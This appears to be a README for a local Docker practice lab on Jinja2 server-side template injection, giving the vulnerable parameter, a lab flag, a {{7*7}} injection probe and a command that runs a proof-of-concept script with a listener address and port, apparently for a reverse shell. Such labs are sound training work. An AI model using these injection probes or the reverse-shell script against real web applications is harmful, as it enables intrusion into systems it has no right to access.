# SSTI Jinja2 Lab (Docker)

```bash
./labctl.sh up ssti
```

- URL: http://127.0.0.1:8102/?name=test
- Param: `name`
- Flag: `/flag.txt` → `OSWE{ssti_jinja2_lab_flag}`

```bash
python3 ../poc.py 127.0.0.1 8102 127.0.0.1 4444 --endpoint / --param-name name
```

Probe: `/?name={{7*7}}` should show `49`.
